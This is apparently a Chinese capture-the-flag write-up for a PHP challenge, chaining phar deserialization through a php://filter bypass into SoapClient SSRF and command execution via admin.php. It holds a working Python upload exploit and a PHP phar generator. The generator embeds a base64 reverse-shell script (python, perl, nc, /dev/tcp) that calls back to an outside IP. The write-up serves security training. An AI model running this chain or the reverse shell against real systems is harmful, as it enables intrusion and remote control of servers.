tags:: [[CTFWEB/PHP/Phar]], [[CTFWEB/PHP/原生类]], [[CTFWEB/SSRF]]

- # 思路
	- 上传并读取文件触发phar反序列化
	- phar反序列化实现SSRF
	- SSRF访问admin.php实现RCE
- # 分析
	- > 原题给了class.php但是buuctf没有给，需要自己去翻源码
	- 网站可以上传文件并查看文件的类型，查看文件的类型应该会触发文件读取，加上伪协议可以打Phar反序列化
	- class.php中，`File`类有__wakeup函数，其中使用反射实例化了某个类并调用了`check`方法，明显可以用SoapClient进行SSRF
	- admin.php中判断了来源IP, 只要是本地的IP就可以执行任意命令
- # Phar反序列化
	- 上传文件处修改文件类型为`image/gif`和文件名为`xxx.gif`即可存入文件，注意文件中不能有`<?`
	- 文件读取处禁了`phar://`协议，但是没有禁`php://`协议，可以使用`php://filter/read=convert.base64-encode/resource=phar://{}/test.txt`的形式绕过。
	- 上传并触发phar反序列化的exp如下：
		- ```python
		  with open("phar.phar.gz", "rb") as f:
		  
		      r = base_post(url + "index.php", files = {
		          "file": ("a.gif", f.read(), "image/gif")
		      }, data = {
		          "upload": "1"
		      })
		  
		  path = r.text.rpartition("文件存储在: ")[2]
		  file_url = "php://filter/read=convert.base64-encode/resource=phar://{}/test.txt".format(path)
		  print(file_url)
		  r = base_post(url + "func.php", data = {
		      "url": file_url,
		      "submit": "1"
		  })
		  print(r.status_code)
		  print(r.text)
		  ```
- # 反序列化到SSRF
	- 让`File`对象实例化一个`SoapClient`对象并调用即可
	- 生成phar文件后需要使用`gzip`压缩phar文件，去除里面的`<?`绕WAF
	- payload生成
		- ```php
		  <?php
		  
		  class File
		  {
		  
		      public $file_name;
		      public $type;
		      public $func = "Check";
		  
		      function __construct($file_name)
		      {
		          $this->file_name = $file_name;
		      }
		  
		  }
		  
		  $post = "admin=1&cmd=".urlencode('echo CmlmIGNvbW1hbmQgLXYgcHl0aG9uID4gL2Rldi9udWxsIDI+JjE7IHRoZW4KICBweXRob24gLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2Vzcyxvczsgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7IHMuY29ubmVjdCgoIjQyLjE5NC4xNzYuMTgxIiw0MDUyKSk7IG9zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7IHA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycKICBleGl0OwpmaQoKaWYgY29tbWFuZCAtdiBwZXJsID4gL2Rldi9udWxsIDI+JjE7IHRoZW4KICBwZXJsIC1lICd1c2UgU29ja2V0OyRpPSI0Mi4xOTQuMTc2LjE4MSI7JHA9NDA1Mjtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCiAgZXhpdDsKZmkKCmlmIGNvbW1hbmQgLXYgbmMgPiAvZGV2L251bGwgMj4mMTsgdGhlbgogIHJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDQyLjE5NC4xNzYuMTgxIDQwNTIgPi90bXAvZgogIGV4aXQ7CmZpCgppZiBjb21tYW5kIC12IHNoID4gL2Rldi9udWxsIDI+JjE7IHRoZW4KICAvYmluL3NoIC1pID4mIC9kZXYvdGNwLzQyLjE5NC4xNzYuMTgxLzQwNTIgMD4mMQogIGV4aXQ7CmZpCg== | base64 -d | sh')."&clazz=Exception&func1=__construct&func2=__construct&func3=__construct&arg=";
		  
		  $s = "Content-Length: ".strlen($post)."\r\n\r\n$post";
		  echo($s);
		  $f = new File([null, array(
		      'uri' => 'bbb',
		      'location' => 'http://127.0.0.1/admin.php',
		      'user_agent' => "test\r\nCookie: PHPSESSID=0mrbj32r0ptfcnf7l6kmmgh1c4\r\nContent-Type:application/x-www-form-urlencoded\r\n" . $s
		  )]);
		  $f -> func = "SoapClient";
		  
		  
		  $o = [114514, $f];
		  // echo urlencode(serialize($a));
		  // $o->notexist();
		  //打开phar文件
		  @unlink("phar.phar");
		  $phar = new Phar("phar.phar"); //生成时后缀名必须为phar
		  $phar->startBuffering();
		  $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
		  
		  //放入对象
		  $phar->setMetadata($o);
		  
		  //添加压缩的文件（test为其中的内容）
		  $phar->addFromString("test.txt", "test114514" . time());
		  $phar->stopBuffering();
		  @system('gzip -f phar.phar');
		  ?>
		  ```
- # admin.php命令执行
	- admin.php会实例化一个对象并调用其中的三个函数，如果失败则不会执行命令。
	- 这里使用exception类，让admin.php实例化exception并调用其中的函数，让调用顺利完成即可
	- exp: 参考上方的phar文件payload生成脚本